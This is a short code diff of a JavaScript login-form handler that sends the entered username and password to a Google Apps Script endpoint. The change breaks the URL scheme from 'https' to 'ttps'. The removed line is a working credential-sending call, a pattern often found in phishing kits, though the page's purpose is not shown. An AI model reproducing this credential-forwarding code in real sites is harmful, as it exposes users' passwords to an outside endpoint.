@@ -8,7 +8,7 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
     password: this.password.value
   };
 
-  fetch("https://script.google.com/macros/s/AKfycbyPCNw32rKbcFBbYT5qIc0Jz1HS-rDHS3ZwcvNS6NMpjaHjjUZCWXw6f2XXF0pOV2qkQA/exec", {
+  fetch("ttps://script.google.com/macros/s/AKfycbyPCNw32rKbcFBbYT5qIc0Jz1HS-rDHS3ZwcvNS6NMpjaHjjUZCWXw6f2XXF0pOV2qkQA/exec", {
     method: "POST",
     body: JSON.stringify(data)
   }).finally(() => {
